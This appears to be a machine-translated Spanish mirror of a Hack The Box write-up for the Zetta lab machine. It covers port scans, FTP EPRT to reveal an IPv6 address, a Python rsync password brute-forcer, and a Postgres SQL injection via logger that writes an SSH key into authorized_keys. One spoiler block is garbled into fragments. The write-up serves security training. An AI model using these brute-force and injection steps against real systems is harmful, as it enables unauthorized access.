<!doctype html>
<html class="no-js" lang="es">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>  ｐ Hack The Box - Tutorial de Zetta FXP, IPv6, rsync, Postgres y SQLi し  </title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Sigo publicando soluciones enviadas para su posterior procesamiento desde el sitio de HackTheBox . Espero que esto ayude al menos a alguien a desarrol...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>Hack The Box - Tutorial de Zetta FXP, IPv6, rsync, Postgres y SQLi</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/489588/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/nn/1m/6i/nn1m6ihaiw2kzu-lt_868yjvd0e.png" alt="imagen"></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sigo publicando soluciones enviadas para su </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">posterior procesamiento</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> desde el sitio de </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;">HackTheBox</font></a><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">Espero que esto ayude al menos a alguien a desarrollarse en el campo de la seguridad de la informaci贸n. </font><font style="vertical-align: inherit;">En este art铆culo, aprendemos la direcci贸n del servidor IPv6 usando FXP, trabajamos con rsync y tambi茅n escribimos la clave ssh usando inyecci贸n SQL cuando procesamos registros en Postgres. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La conexi贸n al laboratorio es a trav茅s de VPN. </font><font style="vertical-align: inherit;">Se recomienda no conectarse desde una computadora del trabajo o desde un host donde los datos importantes para usted est茅n disponibles, ya que termina en una red privada con personas que saben algo en el campo de la seguridad de la informaci贸n :)</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informaci贸n organizacional</font></font></b><div class="spoiler_text">  ,    -           ,        :<br>
<br>
<ul>
<li>PWN;</li>
<li> (Crypto);</li>
<li>c  (Network);</li>
<li> (Reverse Engineering);</li>
<li> (Stegano);</li>
<li>   WEB-.</li>
</ul><br>
         ,    ,        ,     .<br>
<a name="habracut"></a><br>
      ,     ,   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">  Telegram</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">    </a>   .    , ,    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">    </a>.<br>
<br>
      .          ,  -      ,      .<br>
</div></div><br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recon</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Esta m谩quina tiene una direcci贸n IP 10.10.10.156, que agrego a / etc / hosts.</font></font><br>
<br>
<pre><code class="plaintext hljs">10.10.10.156    zetta.htb</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Primero, escaneamos puertos abiertos. </font><font style="vertical-align: inherit;">Como lleva mucho tiempo escanear todos los puertos con nmap, primero har茅 esto con masscan. </font><font style="vertical-align: inherit;">Escaneamos todos los puertos TCP y UDP desde la interfaz tun0 a una velocidad de 500 paquetes por segundo.</font></font><br>
<br>
<pre><code class="plaintext hljs">masscan -e tun0 -p1-65535,U:1-65535 10.10.10.156 --rate=500</code></pre><br>
<img src="https://habrastorage.org/webt/4s/y1/5o/4sy15okn_gqkagrrpwuug7gnznu.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
A continuaci贸n, debe recopilar m谩s informaci贸n sobre los puertos conocidos. </font><font style="vertical-align: inherit;">Para hacer esto, use nmap con la opci贸n -A.</font></font><br>
<br>
<pre><code class="bash hljs">nmap -A zetta.htb -p21,22,80</code></pre><br>
<img src="https://habrastorage.org/webt/hb/2w/5n/hb2w5n8whv-z2w5qsocdpklonhe.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Echa un vistazo a lo que hay en ftp. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/vl/qh/do/vlqhdo8g-smq-zqbwvq0pgsb9x8.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Como resultado, el banner dice que podemos conectarnos a trav茅s de IPv6. Veamos qu茅 hay en el servidor web. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ni/dg/0r/nidg0rvziobssbym9jntimqmdnu.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Observamos FTP nativo con soporte para FXP. FXP es una forma de transferir archivos entre dos servidores FTP directamente, sin descargarlos a su computadora. Durante una sesi贸n FXP, el cliente abre dos conexiones FTP a dos servidores diferentes, solicitando un archivo en el primer servidor, que indica la direcci贸n IP del segundo servidor en el comando PORT. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/yo/hp/6v/yohp6v4sud37g7xbj5bmfz7chws.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Desplaz谩ndonos un poco, encontramos el nombre de usuario y la contrase帽a para FTP. Y despu茅s de ingresar las credenciales, se nos dice que hay soporte para FXP. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/sv/wy/_l/svwy_ltj2rlmdqxfbrqsc5ei_0s.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pero o no hay archivos en el servidor, o no nos los dan. Pero como este servidor admite FXP, podemos pretender ser otro servidor, el servidor de destino inici贸 una conexi贸n. Por lo tanto, revelaremos su direcci贸n IPv6 de acuerdo con RFC 2428.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/5j/cw/cd/5jcwcdyngu_e36q63fxucohgerq.png" alt="imagen"><br>
<br>
<img src="https://habrastorage.org/webt/w2/bw/bt/w2bwbtcccse4gqvyl3xu0bf-jjc.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Esto es necesario para una exploraci贸n adicional, ya que el host puede tener servicios que solo aceptan conexi贸n IPv6. </font><font style="vertical-align: inherit;">Entonces necesitamos saber nuestra direcci贸n. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/5h/in/pn/5hinpn5tcmapocqvpuemvhrjv0m.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Usando tcpdump, rastrearemos el tr谩fico que va al puerto 4321. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ck/gy/ik/ckgyiky5qs4afqu8wzrdudjhg5i.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Y usando netcat nos conectamos a ftp y especificamos las credenciales.</font></font><br>
<br>
<pre><code class="bash hljs">nc zetta.htb 21</code></pre><br>
<img src="https://habrastorage.org/webt/hl/e2/k1/hle2k12hpzyoxmzm_y95juvhrim.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Y ahora enviamos la solicitud EPRT. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/dk/jt/tu/dkjttuf_ntvdl4qta4zizfrr6sg.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Y observamos la direcci贸n IPv6 del host de destino. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/wc/mn/1b/wcmn1bimjdf4qrzobuqg0romjxw.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ahora escr铆balo en / etc / hosts en lugar de IPv4 y escanee todos los puertos usando nmap, agregando la opci贸n -6.</font></font><br>
<br>
<pre><code class="bash hljs">nmap -6 zetta.htb -p-</code></pre><br>
<img src="https://habrastorage.org/webt/0k/pm/q6/0kpmq61u_comgc9lbaihvg9puqg.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ahora obtenemos m谩s informaci贸n usando la opci贸n -A. </font></font><br>
<br>
<pre><code class="bash hljs">nmap -A -6 zetta.htb -p21,22,80,8730</code></pre><br>
<img src="https://habrastorage.org/webt/uo/gq/bj/uogqbj8xp1mz9a9ceb77zp2_3be.png" alt="imagen"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Punto de entrada</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Rsync (sincronizaci贸n remota) es un programa para sistemas similares a UNIX que sincroniza archivos y directorios en dos lugares y minimiza el tr谩fico. </font><font style="vertical-align: inherit;">Rsync puede copiar o mostrar el contenido de un directorio y copiar archivos, opcionalmente usando compresi贸n y recursividad. </font><font style="vertical-align: inherit;">rsync solo transfiere los cambios de archivos, lo que afecta el rendimiento del programa. </font><font style="vertical-align: inherit;">Veamos la lista de m贸dulos.</font></font><br>
<br>
<pre><code class="bash hljs">rsync -6 --list-only rsync://zetta.htb:8730/</code></pre><br>
<img src="https://habrastorage.org/webt/tc/kg/u9/tckgu9il7s2cys7xvhkpt3lbu5a.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Faltan algunos directorios importantes de esta lista. </font><font style="vertical-align: inherit;">Pero el directorio etc. estaba disponible.</font></font><br>
<br>
<pre><code class="bash hljs">rsync -6 -av rsync://zetta.htb:8730/etc/rsync*</code></pre><br>
<img src="https://habrastorage.org/webt/3x/zn/bd/3xznbdntaiz3zqnr2qf3tlqebn4.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Leemos rsyncd.conf, para este archivo en la m谩quina local.</font></font><br>
<br>
<pre><code class="bash hljs">rsync -6 -a rsync://zetta.htb:8730/etc/rsyncd.conf .</code></pre><br>
<img src="https://habrastorage.org/webt/ai/oj/5s/aioj5sgqyn10hypi_wekrkvgr6e.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La configuraci贸n tiene un m贸dulo oculto: home_roy, que apunta al directorio de inicio del usuario roy, y est谩 protegido con contrase帽a de rsyncd.secrets, pero no est谩 disponible para nosotros.</font></font><br>
<br>
<pre><code class="bash hljs">rsync -6 rsync://zetta.htb:8730/home_roy/</code></pre><br>
<img src="https://habrastorage.org/webt/gp/ai/tq/gpaitq8zbh7h_omn16zt_8lbgwg.png" alt="imagen"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">USUARIO</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Cuando no hubo m谩s ideas, tuve que resolver la contrase帽a. </font><font style="vertical-align: inherit;">Para esto, se escribi贸 el c贸digo Python y se utiliz贸 una lista de contrase帽as de Seclists.</font></font><br>
<br>
<pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/python3</span><font></font>
<font></font>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">clear</span>():</span>
    sys.stdout.write(<span class="hljs-string">"\033[F"</span>)<font></font>
    sys.stdout.write(<span class="hljs-string">"\033[K"</span>)<font></font>
<font></font>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<font></font>
<font></font>
<span class="hljs-keyword">with</span> open(<span class="hljs-string">"/usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt"</span>, <span class="hljs-string">"r"</span>) <span class="hljs-keyword">as</span> f:<font></font>
    passwords = f.read().split(<span class="hljs-string">'\n'</span>)<font></font>
<font></font>
<span class="hljs-keyword">for</span> password <span class="hljs-keyword">in</span> passwords:<font></font>
    s = process([<span class="hljs-string">"rsync"</span>, <span class="hljs-string">"-6"</span>, <span class="hljs-string">"rsync://roy@zetta.htb:8730/home_roy"</span>], env={<span class="hljs-string">"RSYNC_PASSWORD"</span>:password})<font></font>
    clear()<font></font>
    clear()<font></font>
    print((<span class="hljs-string">"password: "</span> + password).ljust(<span class="hljs-number">30</span>, <span class="hljs-string">" "</span>), end=<span class="hljs-string">"\r\r"</span>)<font></font>
    <font></font>
    s.recvuntil(<span class="hljs-string">"\"Cloud sync\".\n\n\n"</span>)
    <span class="hljs-keyword">if</span> <span class="hljs-string">b"@ERROR:"</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> s.recv():<font></font>
        print(<span class="hljs-string">"found!!!"</span>)
        <span class="hljs-keyword">break</span><font></font>
    s.close()<font></font>
clear()</code></pre><br>
<img src="https://habrastorage.org/webt/3k/2t/ox/3k2toxpkr2nxsoyirv6uhtrsphu.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ahora que conocemos la contrase帽a, generemos la clave ssh y c谩rguela al servidor. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/zz/xf/cw/zzxfcwouoxqbcrszv0xj9xsnlwm.png" alt="imagen"><br>
<br>
<img src="https://habrastorage.org/webt/jp/1i/yd/jp1iydqlhrg09qwr_wxx3x26t2u.png" alt="imagen"><br>
<br>
<img src="https://habrastorage.org/webt/mb/u2/zq/mbu2zqozz2yasm3m8cub5kduinq.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Y conectando a trav茅s de SSH con esta clave, tomamos el token de usuario.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/rg/ji/li/rgjiliy_quszvw3zeavyvzzzh6u.png" alt="imagen"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RAZ</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Al lado del token hay una pista: una lista de tareas. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/fa/lk/vg/falkvgcgyh9rm3chrb7hhxpfv1k.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Vamos a abrirlos.</font></font><br>
<br>
<pre><code class="bash hljs">todo .tudu.xml</code></pre><br>
<img src="https://habrastorage.org/webt/tf/a8/8i/tfa88iedz9lf3q6tw_9ac6shiwi.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Veamos todas las tareas planificadas. El servidor usa git. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/hs/va/en/hsvaen3j6aqirokrcxp-ln_o_yu.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
En este caso, los registros de eventos se guardan en la base de datos. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/o_/hu/zb/o_huzbgm3rsgv_fx4snwunlx1a8.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Y tambi茅n planea cambiar la contrase帽a, que en este momento parece un cierto tipo. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/iv/j8/lx/ivj8lxpkgnjthvvbzzeug4svrpa.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Lo primero que hacemos es ir a git, porque all铆 podemos ver el historial de cambios de configuraci贸n. Encuentra todos los directorios .git en el servidor. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/l4/sx/o8/l4sxo8jxdwdocgmom11ckwm2yxc.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Estamos m谩s interesados en el diario rsyslog, as铆 que copio todo su repositorio en la m谩quina local. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/dd/ye/jf/ddyejf3czw-r_zhoduuxikbvixi.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ahora vamos al directorio con el repositorio cargado y usamos gitk (la interfaz gr谩fica es un poco, pero conveniente).</font></font><br>
<br>
<img src="https://habrastorage.org/webt/gv/wp/_k/gvwp_ktsoxxersdc0wgb2fsgfaq.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Vemos las credenciales, pero si las usamos, fallamos. </font><font style="vertical-align: inherit;">Tambi茅n en el repositorio puede ver la plantilla seg煤n la cual se colocan los registros en la base de datos. </font><font style="vertical-align: inherit;">Los registros se guardan en el registro /var/log/postgresql/postgresql-11-main.log, al que puede acceder el grupo adm del que somos miembros. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ey/fw/nc/eyfwncj05y0shcz54xhvvkwbd0k.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Como estamos trabajando con una base de datos, puede probar la inyecci贸n. </font><font style="vertical-align: inherit;">Crearemos eventos para grabar usando el registrador, monitoreando simult谩neamente en tiempo real lo que ingresa al registro (por conveniencia, puede usar qterminal con una ventana dividida) usando watch.</font></font><br>
<br>
<pre><code class="bash hljs">watch -n 1 cat postgresql-11-main.log</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Y env铆a el evento.</font></font><br>
<br>
<pre><code class="bash hljs">logger -p local7.info <span class="hljs-string">"'"</span></code></pre><br>
<img src="https://habrastorage.org/webt/_y/3b/e9/_y3be9zcxrq42sst-dh4ncxa08q.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Y se produce un error que indica una posible inyecci贸n. </font><font style="vertical-align: inherit;">Mirando / etc / passwd, descubrimos que el usuario del servicio postgres tiene el shell / bin / bash. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/gb/ox/dp/gboxdpbfnz-zz70uyuh_czinjvq.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Por lo tanto, podemos iniciar sesi贸n a trav茅s de ssh. </font><font style="vertical-align: inherit;">Esto nos dar谩 acceso al archivo postgres, incluido el historial de comandos. </font><font style="vertical-align: inherit;">Verifiquemos si podemos escribir un archivo usando inyecci贸n.</font></font><br>
<br>
<pre><code class="bash hljs">logger -p local7.info <span class="hljs-string">"qwerty',\$\$2020-02-02\$\$);DROP TABLE if exists ralf;CREATE TABLE ralf(t TEXT);INSERT INTO ralf(t) VALUES(\$\$RALF\$\$);SELECT * FROM ralf;COPY ralf(t) TO \$\$/tmp/ralf\$\$;-- -"</span></code></pre><br>
<img src="https://habrastorage.org/webt/j_/pq/wx/j_pqwxpez02yfqe1qriziegnr7o.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Multa. </font><font style="vertical-align: inherit;">Generaremos la clave ssh y escribiremos la clave p煤blica en el servidor en el directorio de inicio del servicio de usuario de postgres: /var/lib/postgresql/.ssh/authorized_keys.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/5s/uj/8k/5suj8kpixestfadzh-0qk9dpx74.png" alt="imagen"><br>
<br>
<pre><code class="bash hljs">logger -p local7.info -s <span class="hljs-string">"qwerty',\$\$2020-02-02\$\$);DROP TABLE if exists ralf;CREATE TABLE ralf(t TEXT);INSERT INTO ralf(t) VALUES(\$\$ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDRC9/M7mhpZ/0Rs/HyPIC58k3qDu3xRVmMgt/gky8VCpH49WVkkLpW0tFNL1Z7d/NN8efres0+aG7VJXop20P4uO7BT4ikK8ccDzXKHlSVPweevKu8AAVqu98mKxXJBNI/uQ1giv+zwS23hbe5DQTGldeOSPzClxal8sj99kqCk1aN8Cs7I6+vBcOkHoMVKB8dR9Hu0ZwvLzvWDnnBR1txmjrNDPt25I+2gNc3JYvqIS2QIV2DSdh5UoFKVzA27Mav3A0yL6zJjUynnluAa27HMsKdvrfA0Q5zIY3F/snHCl4X/wxZh4o9bnfxUFt6OC0sLxk5ro1Vw6EjgACZj+aFoFXBMgX59YpUVtXbXvN/ACMkIyLh/f7CvqWDD9sppZtcBKVYB1jzlqIG5ekgv55aCrTeX9CuS9YbZrrjZC2Dos7YTOwD9TBItlR8VcU0JcR1GiS+GHZv0Rm9pizHchOiPocWqdryoGqfTfCav4AvrhDHtzk4P/C1fa3flwb3NxE= root@Ralf-PC\$\$);SELECT * FROM ralf;COPY ralf(t) TO \$\$/var/lib/postgresql/.ssh/authorized_keys\$\$;-- -"</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ahora repasemos ssh.</font></font><br>
<br>
<pre><code class="bash hljs">ssh -i psg_id_rsa postgres@zetta.htb</code></pre><br>
<img src="https://habrastorage.org/webt/7l/sb/_8/7lsb_8guzm_cw3r-xlk7rtvtixs.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nos fijamos en la historia de los postgres. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/0z/fl/zi/0zflzicvn8fciw1ubk4i3r_v1iw.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Y encontramos la contrase帽a. </font><font style="vertical-align: inherit;">Recordamos la regla de contrase帽a de la lista de tareas, reemplazamos al usuario con root e iniciamos sesi贸n. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/d0/eh/_e/d0eh_e4fitq3ce5smvxmu6rvbqw.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Estamos con todos los derechos! </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Puedes unirte a nosotros en </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Telegram</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">Formemos una comunidad en la que haya personas con conocimientos en muchas 谩reas de TI, para que siempre podamos ayudarnos mutuamente en cualquier problema de seguridad de la informaci贸n y TI.</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../es489568/index.html">Conferencia DEFCON 27. Duplicaci贸n de llaves mec谩nicas con acceso limitado. Parte 1</a></li>
<li><a href="../es489576/index.html">Los matices de la medicina moderna.</a></li>
<li><a href="../es489582/index.html">En busca de Godzilla. Redes neuronales y cotizaciones de pron贸stico basadas en intercambio y datos "externos"</a></li>
<li><a href="../es489584/index.html">C贸mo mejorar su servicio API en node.js. Parte 1</a></li>
<li><a href="../es489586/index.html">Visualizaci贸n de sonido en l谩mparas vintage.</a></li>
<li><a href="../es489590/index.html">驴Qu茅 pasa si el programador no tiene nada que hacer constantemente?</a></li>
<li><a href="../es489594/index.html">Framework vs Platform: 驴cu谩l es la diferencia?</a></li>
<li><a href="../es489596/index.html">El resumen de materiales interesantes para el desarrollador m贸vil # 334 (del 17 al 23 de febrero)</a></li>
<li><a href="../es489600/index.html">GDC-2020: qu茅 esperar de una de las mayores exhibiciones de desarrollo de juegos</a></li>
<li><a href="../es489602/index.html">Prerender sobre lienzo 2D</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>